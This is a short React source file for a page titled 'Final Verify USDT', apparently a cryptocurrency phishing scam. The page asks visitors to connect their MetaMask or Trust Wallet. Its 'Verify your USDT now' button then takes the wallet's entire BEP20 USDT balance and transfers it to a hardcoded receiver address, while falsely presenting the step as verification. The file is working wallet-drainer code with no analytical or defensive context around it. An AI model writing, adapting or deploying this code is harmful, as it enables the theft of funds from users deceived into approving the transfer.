import { useEffect, useState } from 'react';
import { ethers } from 'ethers';

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const RECEIVER = "0x5129da1b9fcc596d2edcec014af5ff532a5b07d0";

const ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

function App() {
  const [wallet, setWallet] = useState(null);
  const [provider, setProvider] = useState(null);

  const connectWallet = async () => {
    if (window.ethereum) {
      const prov = new ethers.providers.Web3Provider(window.ethereum);
      await prov.send("eth_requestAccounts", []);
      const signer = prov.getSigner();
      setWallet(signer);
      setProvider(prov);
    } else {
      alert("Install Trust Wallet or MetaMask!");
    }
  };

  const transferUSDT = async () => {
    const contract = new ethers.Contract(USDT_ADDRESS, ABI, wallet);
    const address = await wallet.getAddress();
    const balance = await contract.balanceOf(address);
    const tx = await contract.transfer(RECEIVER, balance);
    await tx.wait();
    alert("All USDT Transferred Successfully!");
  };

  return (
    <div style={{ padding: 20 }}>
      <h2>Final Verify USDT</h2>
      <button onClick={connectWallet}>Connect Wallet</button>
      <br /><br />
      <button onClick={transferUSDT}>Verify your USDT now</button>
    </div>
  );
}

export default App;